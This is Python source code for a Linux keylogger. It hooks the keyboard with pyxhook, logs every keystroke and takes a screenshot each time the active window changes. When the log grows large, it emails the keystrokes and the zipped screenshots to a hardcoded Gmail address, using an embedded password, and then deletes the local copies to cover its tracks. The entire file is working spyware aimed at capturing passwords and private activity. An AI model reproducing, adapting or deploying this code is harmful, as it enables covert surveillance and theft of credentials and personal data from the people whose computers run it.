from send_email import send_mail, send_file
import pyxhook
import os
import socket
from dictionaries import characters, characters_list, modificators_key


# This function is called every time a key is pressed.
def key_pressed(event):
	global process_name, var
	file = open(log_file, 'a')  # Open the file as  "add text".

	# Takes a screenshot of the window and save it in the image directory.
	pic_name = "import -window root -quality 10 " + home + ".local/share/pics/"\
		+ str(var) + ".jpg"

	# If the process of the current window is different from the previous one.
	if event.WindowProcName != process_name:
		os.system(pic_name)  # Executes pic_name.
		process_name = event.WindowProcName  # Renames process_name.
		var += 1

	# Writes the key pressed.
	file.write(event.Key)

	# Executes the functions.
	delete_and_write_words()
	send_and_delete_logfile()


# This function sends and deletes the file that contains all the written keys.
def send_and_delete_logfile():
	global var
	read = open(log_file, "r").read().encode("utf-8")  # Open the file as  "add text".

	# If the length of "read" is greater than 10000.
	if len(read) >= 10000:
		# Try send an email
		try:
			# Send a email with the content of the log file.
			send_mail("josesantonios17@gmail.com", "josesantonios7@gmail.com", read, "lopez86248624")
			os.system("rm " + log_file)  # Delete the log file.

			# Send a email with the content of all pictures.
			os.system("tar -czvf $HOME/.local/share/pics/file.tar.gz $HOME/.local/share/pics/")
			send_file("josesantonios17@gmail.com", "josesantonios7@gmail.com",
				home + ".local/share/pics/file.tar.gz", "lopez86248624")
			os.system("rm -r $HOME/.local/share/pics/")  # Delete the file compressed.
			os.system("mkdir $HOME/.local/share/pics/")
			var = 0

		# If an error has occurred, show this.
		except(socket.gaierror):
			print("Not internet")
		# If an error has occurred, show this.
		except(OSError):
			print("Not internet, or the internet is too slow")


# This function modifies the log file, replaces the unintelligible words, to words understandable,
# or simply does not display those words.
def delete_and_write_words():
	read = open(log_file, "r").read()  # Open the file as  "add text".

	file = open(log_file, "w")  # Open the file as a writing file.

	# Replace all the unintelligible words to nothing.
	for i in range(len(modificators_key())):
		read = read.replace(modificators_key()[i], "")

	# Replace all unintelligible words to understandable words.
	for l in range(len(characters_list())):
		read = read.replace(characters_list()[l], characters()[characters_list()[l]])
	file.write(read)


process_name = None  # Variable that contains the last process name captured by event.WindowProcName
home = "/home/" + os.listdir("/home/")[0] + "/"  # The home directory.
log_file = home + ".local/share/session.log"  # The log file.
os.system("mkdir $HOME/.local/share/pics/")  # Makes a directory of pictures.
number_of_picture = len(os.listdir(home + ".local/share/pics/"))  # Number of files in the pics dir.
var = number_of_picture  # A auxiliar that change the name picture file.


hook = pyxhook.HookManager()  # Creates a hook manager.
hook.KeyDown = key_pressed  # Creates a loop from the function key_pressed.
hook.HookKeyboard()  # Captures the keyboard.
hook.start()  # Start the hook.
